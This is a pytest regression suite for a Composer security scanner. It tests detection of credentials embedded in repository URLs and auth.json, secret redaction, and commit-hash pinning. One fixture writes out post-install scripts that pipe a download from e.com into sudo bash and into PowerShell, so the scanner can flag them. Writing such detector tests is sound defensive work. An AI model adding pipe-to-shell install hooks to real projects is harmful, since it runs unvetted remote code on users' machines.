"""Regression tests for false-negative audit fixes (batch 5).

Each class documents the false negative that was fixed and covers:
  (a) the previously-missed violation now fires,
  (b) related benign input still passes,
  (c) existing true-positives still fire.
"""
from __future__ import annotations

import json
import pathlib

from pipeline_check.core.checks.composer.base import ComposerContext
from pipeline_check.core.checks.composer.pipelines import ComposerChecks


def _scan(
    tmp_path: pathlib.Path,
    manifest: dict,
) -> dict:
    (tmp_path / "composer.json").write_text(
        json.dumps(manifest), encoding="utf-8",
    )
    ctx = ComposerContext.from_path(str(tmp_path / "composer.json"))
    findings = ComposerChecks(ctx).run()
    return {f.check_id: f for f in findings}


def _scan_with_auth(
    tmp_path: pathlib.Path,
    auth_content: dict,
) -> dict:
    (tmp_path / "composer.json").write_text(
        json.dumps({"name": "x"}), encoding="utf-8",
    )
    (tmp_path / "auth.json").write_text(
        json.dumps(auth_content), encoding="utf-8",
    )
    ctx = ComposerContext.from_path(str(tmp_path / "composer.json"))
    findings = ComposerChecks(ctx).run()
    return {f.check_id: f for f in findings}


# ── COMPOSER-004 false-negative regressions ───────────────────
#
# Before the fix, the password group ``([^@/\s]+)`` excluded ``/``, so
# a base64 token such as ``aGVsbG8/d29ybGQ=`` (contains ``/``) would
# not match and the rule would silently pass.  Additionally, a password
# containing a literal ``@`` (e.g. ``p@ssword``) would only capture the
# substring before the first ``@``, leaving the rest of the secret
# visible in the description (partial-leak).


class TestCOMPOSER004FalseNegatives:
    def test_fires_on_base64_password_with_slash(self, tmp_path):
        """Base64 token containing ``/`` was previously missed (FN fix)."""
        findings = _scan(
            tmp_path,
            {
                "name": "x",
                "repositories": [{
                    "type": "composer",
                    # base64("hello/world") = "aGVsbG8vd29ybGQ="
                    "url": "https://bot:aGVsbG8vd29ybGQ=@nexus.corp/composer",
                }],
            },
        )
        assert not findings["COMPOSER-004"].passed
        # Secret must be fully redacted in the description.
        assert "aGVsbG8vd29ybGQ=" not in findings["COMPOSER-004"].description

    def test_fires_on_base64_password_with_plus(self, tmp_path):
        """Base64 token containing ``+`` — belt-and-suspenders check."""
        findings = _scan(
            tmp_path,
            {
                "name": "x",
                "repositories": [{
                    "type": "composer",
                    "url": "https://bot:dG9rZW4+dmFsdWU=@nexus.corp/composer",
                }],
            },
        )
        assert not findings["COMPOSER-004"].passed
        assert "dG9rZW4+dmFsdWU=" not in findings["COMPOSER-004"].description

    def test_full_secret_redacted_when_password_contains_at(self, tmp_path):
        """Password containing ``@`` previously leaked partial secret (FN fix).

        ``bot:p@ssword@host`` — only ``p`` was captured; ``ssword`` remained
        in the description.  Now the full userinfo up to the last ``@`` is
        captured so the entire password is redacted.
        """
        findings = _scan(
            tmp_path,
            {
                "name": "x",
                "repositories": [{
                    "type": "composer",
                    "url": "https://bot:p@ssword@nexus.corp/composer",
                }],
            },
        )
        assert not findings["COMPOSER-004"].passed
        desc = findings["COMPOSER-004"].description
        # Neither half of the split secret should appear unredacted.
        assert "ssword" not in desc
        assert "p@ss" not in desc

    # ── benign inputs still pass ──────────────────────────────

    def test_passes_on_clean_url_no_credentials(self, tmp_path):
        """A URL without any userinfo must not fire."""
        findings = _scan(
            tmp_path,
            {
                "name": "x",
                "repositories": [{
                    "type": "composer",
                    "url": "https://nexus.corp/composer",
                }],
            },
        )
        assert findings["COMPOSER-004"].passed

    def test_passes_on_username_only_url(self, tmp_path):
        """OAuth-style ``user@host`` URL (no password) must not fire."""
        findings = _scan(
            tmp_path,
            {
                "name": "x",
                "repositories": [{
                    "type": "composer",
                    "url": "https://deploy@nexus.corp/composer",
                }],
            },
        )
        assert findings["COMPOSER-004"].passed

    def test_passes_on_base64_placeholder_in_password(self, tmp_path):
        """A ``${...}`` placeholder still passes even without ``/`` in it."""
        findings = _scan(
            tmp_path,
            {
                "name": "x",
                "repositories": [{
                    "type": "composer",
                    "url": "https://bot:${COMPOSER_TOKEN}@nexus.corp/composer",
                }],
            },
        )
        assert findings["COMPOSER-004"].passed

    # ── existing true-positive still fires ───────────────────

    def test_still_fires_on_simple_plaintext_credentials(self, tmp_path):
        """Original true-positive (no ``/`` in password) still detected."""
        findings = _scan(
            tmp_path,
            {
                "name": "x",
                "repositories": [{
                    "type": "composer",
                    "url": "https://bot:s3cr3t@nexus.corp/composer",
                }],
            },
        )
        assert not findings["COMPOSER-004"].passed
        assert "s3cr3t" not in findings["COMPOSER-004"].description


# ── COMPOSER-009 false-negative regressions ───────────────────
#
# Before the fix, ``_is_placeholder`` returned ``True`` for any value
# containing a bare ``$`` substring.  A real committed credential whose
# password contained a literal ``$`` (common in generated secrets such
# as ``p@$$w0rd`` or ``Sup3r$ecret``) was therefore silently treated as
# a template placeholder and the rule would pass without firing.
#
# The fix tightens the check to ``${`` (the opening of a shell / Composer
# env-var reference) so that a lone ``$`` inside an otherwise-literal
# string no longer suppresses detection.


class TestCOMPOSER009FalseNegatives:
    def test_fires_on_password_with_literal_dollar_no_braces(self, tmp_path):
        """Credential containing ``$`` but not ``${...}`` must fire (FN fix)."""
        findings = _scan_with_auth(
            tmp_path,
            {
                "http-basic": {
                    "nexus.corp": {
                        "username": "bot",
                        "password": "Sup3r$ecret99",
                    },
                },
            },
        )
        assert not findings["COMPOSER-009"].passed

    def test_fires_on_bearer_token_with_dollar_sign(self, tmp_path):
        """Bearer token containing ``$`` must fire (FN fix)."""
        findings = _scan_with_auth(
            tmp_path,
            {"bearer": {"api.example": "tok$n-abc-123"}},
        )
        assert not findings["COMPOSER-009"].passed

    def test_fires_on_github_oauth_token_with_dollar(self, tmp_path):
        """github-oauth token containing ``$`` must fire (FN fix)."""
        findings = _scan_with_auth(
            tmp_path,
            {"github-oauth": {"github.com": "ghp_$ecretToken"}},
        )
        assert not findings["COMPOSER-009"].passed

    # ── real placeholder values still pass ────────────────────

    def test_passes_on_env_var_reference_placeholder(self, tmp_path):
        """``${ENV_VAR}`` placeholder must still pass after the fix."""
        findings = _scan_with_auth(
            tmp_path,
            {
                "http-basic": {
                    "nexus.corp": {
                        "username": "bot",
                        "password": "${COMPOSER_AUTH_TOKEN}",
                    },
                },
            },
        )
        assert findings["COMPOSER-009"].passed

    def test_passes_on_gha_context_placeholder(self, tmp_path):
        """``${{secrets.TOKEN}}`` GitHub Actions context must still pass."""
        findings = _scan_with_auth(
            tmp_path,
            {
                "http-basic": {
                    "nexus.corp": {
                        "username": "bot",
                        "password": "${{secrets.NEXUS_TOKEN}}",
                    },
                },
            },
        )
        assert findings["COMPOSER-009"].passed

    def test_passes_on_percent_env_placeholder(self, tmp_path):
        """``%env(VAR)%`` Symfony-style placeholder must still pass."""
        findings = _scan_with_auth(
            tmp_path,
            {
                "http-basic": {
                    "nexus.corp": {
                        "username": "bot",
                        "password": "%env(NEXUS_TOKEN)%",
                    },
                },
            },
        )
        assert findings["COMPOSER-009"].passed

    # ── existing true-positive still fires ────────────────────

    def test_still_fires_on_plain_literal_credential(self, tmp_path):
        """Original true-positive (no ``$`` at all) still detected."""
        findings = _scan_with_auth(
            tmp_path,
            {
                "http-basic": {
                    "nexus.corp": {
                        "username": "bot",
                        "password": "s3cr3t",
                    },
                },
            },
        )
        assert not findings["COMPOSER-009"].passed


class TestAudit202607LowComposerC1:
    """2026-07 audit LOW findings (composer_c1 chunk)."""

    def test_composer002_commit_hash_is_pinned(self, tmp_path):
        # The docstring promises a 40-char commit hash is an exact pin.
        from pipeline_check.core.checks.composer.base import (
            is_floating_constraint,
        )
        assert is_floating_constraint(
            "abcdef1234567890abcdef1234567890abcdef12"
        ) is False
        findings = _scan(
            tmp_path,
            {
                "name": "x",
                "require": {
                    "acme/lib": "abcdef1234567890abcdef1234567890abcdef12",
                },
            },
        )
        assert findings["COMPOSER-002"].passed is True

    def test_composer006_sudo_and_powershell_pipe_to_shell_fire(self, tmp_path):
        sudo = _scan(
            tmp_path,
            {
                "name": "x",
                "scripts": {
                    "post-install-cmd": ["curl https://e.com/i | sudo bash"],
                },
            },
        )
        assert sudo["COMPOSER-006"].passed is False
        pwsh = _scan(
            tmp_path,
            {
                "name": "x",
                "scripts": {
                    "post-install-cmd": [
                        "Invoke-WebRequest https://e.com/i | powershell -",
                    ],
                },
            },
        )
        assert pwsh["COMPOSER-006"].passed is False
